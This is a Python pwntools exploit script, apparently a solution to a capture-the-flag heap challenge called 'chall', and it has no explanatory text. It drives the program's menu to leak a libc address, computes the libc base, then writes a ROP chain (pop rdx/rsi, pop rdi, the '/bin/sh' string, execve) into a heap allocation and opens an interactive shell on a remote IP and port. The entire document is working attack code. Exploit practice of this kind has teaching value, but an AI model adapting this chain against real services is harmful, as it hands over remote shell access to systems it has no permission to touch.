from pwn import *

binary = './chall'
host ='69.172.229.147'
port = 9001
libc = './libc-2.27.so'

elf = ELF(binary)
context.binary = binary
context.log_level = 'debug'

if len(sys.argv) >= 2 and sys.argv[1] == 'r':
	# remote
	r = remote(host, port)
	libc = ELF(libc)
elif len(sys.argv) >= 2 and sys.argv[1] == 'd':
	# debug
	r = gdb.debug(binary, '''
			break main
			continue
		''')
	libc = elf.libc
else:
	# local
	r = process(binary)
	libc = elf.libc
	
libc_offset_pop_rdx_rsi = next(libc.search(asm('pop rdx ; pop rsi ; ret')))
libc_offset_pop_rdi = next(libc.search(asm('pop rdi ; ret')))

def new(index, size, data):
    r.sendlineafter("> ", "1")
    r.sendlineafter(": ", str(index))
    r.sendlineafter(": ", str(size))
    r.sendafter(": ", data)

def show(index):
    r.sendlineafter("> ", "2")
    r.sendlineafter(": ", str(index))
    r.recvuntil(": ")
    return r.recvline()

def delete(index):
    r.sendlineafter("> ", "3")
    r.sendlineafter(": ", str(index))

r.sendlineafter(": ", str(0xffff))

leak = int.from_bytes(show(28), 'little')
libc_base = leak-0xa000000199e10

log.info(hex(libc_base))

payload = p64(0)
payload += p64(libc_base + libc_offset_pop_rdx_rsi)
payload += p64(0)
payload += p64(0)
payload += p64(libc_base + libc_offset_pop_rdi)
payload += p64(libc_base + next(libc.search(b'/bin/sh\x00')))
payload += p64(libc_base + libc.symbols['execve'])

new(6, 0x40, payload)
r.sendlineafter("> ", "0")

sleep(1)
r.interactive()